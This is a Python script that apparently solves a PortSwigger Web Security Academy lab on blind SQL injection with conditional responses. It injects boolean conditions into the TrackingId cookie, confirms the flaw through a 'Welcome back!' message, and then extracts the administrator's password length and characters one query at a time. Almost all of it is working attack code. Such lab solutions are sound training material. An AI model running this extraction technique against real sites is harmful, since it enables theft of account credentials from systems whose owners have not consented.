#/usr/bin/python3

"""
The challenge:
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

Example usage:
python3 1-11-SQLi.py -c "cPBMCPBMcpbmCPBMcpbmCPBMCPBMCPBM" -i "cPBMCPBMcpbmCPBM" -u "https://aeaeaeaeaeaeaeaeaeaeaeaeaeaeaeae.web-security-academy.net"
"""

import requests, argparse, string

# parse command line arguments
parser = argparse.ArgumentParser(add_help=True, description='Example usage:\n $python3 1-11-SQLi.py -c "cPBMCPBMcpbmCPBMcpbmCPBMCPBMCPBM" -i "cPBMCPBMcpbmCPBM" -u "https://aeaeaeaeaeaeaeaeaeaeaeaeaeaeaeae.web-security-academy.net"')
parser.add_argument('-u', '--url', action='store', required=True, help='Enter the full url of the page', type=str)
parser.add_argument('-c', '--sessioncookie', action='store', required=True, help='Enter the session cookie value', type=str)
parser.add_argument('-i', '--trackingid', action='store', required=True, help='Enter the tracking ID cookie value', type=str)
args = parser.parse_args()
cookie = args.sessioncookie
id = args.trackingid
if str(args.url[-1]) == "/":
	host = args.url[:-1]
else:
	host = args.url


#See if conditional response is true or false
def findthestring(page):
	return True if "<div>Welcome back!</div>" in page else False

def testquery():
	#this one should be a 200 response and contain the "Welcome back!" string
	query = "' AND '1'='1"
	cookies1 = {'TrackingId':f"{id}{query}", 'session':f"{cookie}"}
	url1 = f"{host}/"
	r1 = requests.request("GET", url=url1, cookies=cookies1)
	responsecode1 = r1.status_code
	rc1 = findthestring(r1.text)

	#this one should also be a 200 response but should NOT contain the "Welcome back!" string
	query2 = "' AND '1'='2"
	cookies2 = {'TrackingId':f"{id}{query2}", 'session':f"{cookie}"}
	url2 = f"{host}/"
	r2 = requests.request("GET", url=url2, cookies=cookies2)
	responsecode2 = r2.status_code
	rc2 = findthestring(r2.text)
	return True if rc1 == True and rc2 == False else False


def getresponselength():
	url = f"{host}/"
	for i in range(1, 100):
		query = f"'AND (SELECT username from users WHERE username='administrator' AND LENGTH(password)={i})='administrator"
		cookies = {'TrackingId':f"{id}{query}", 'session':f"{cookie}"}
		r2 = requests.request("GET", url=url, cookies=cookies)
		responsecode2 = r2.status_code
		rc2 = findthestring(r2.text)
		if rc2 == True:
			return i

def getresponse(r_length):
	url = f"{host}/"
	response = ""
	for i in range(1, r_length+1):
		for char in string.digits + string.ascii_letters:
			query = f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{char}"
			cookies = {'TrackingId':f"{id}{query}", 'session':f"{cookie}"}
			r = requests.request("GET", url=url, cookies=cookies)
			if "Welcome back" in r.text:
				response += char
				print(response)
	return response

#Lets gooo

# Test the validity of the sql query

if testquery() == False:
	print(f"\nResponses are not what was expected. Maybe there is something wrong in the url or cookie parameters?")
	print(f"Here is the help menu:\n")
	parser.print_help()
else:
	print(" ~> looks like the injection works!\n")
	print(" ~> Length response: ")
	lr = getresponselength()
	print(" ~> " + str(lr) + "\n")
	print(" ~> herewego:\n")
	response = getresponse(lr)
	print("\n ~> Done! the result: ")
	print(str(response))

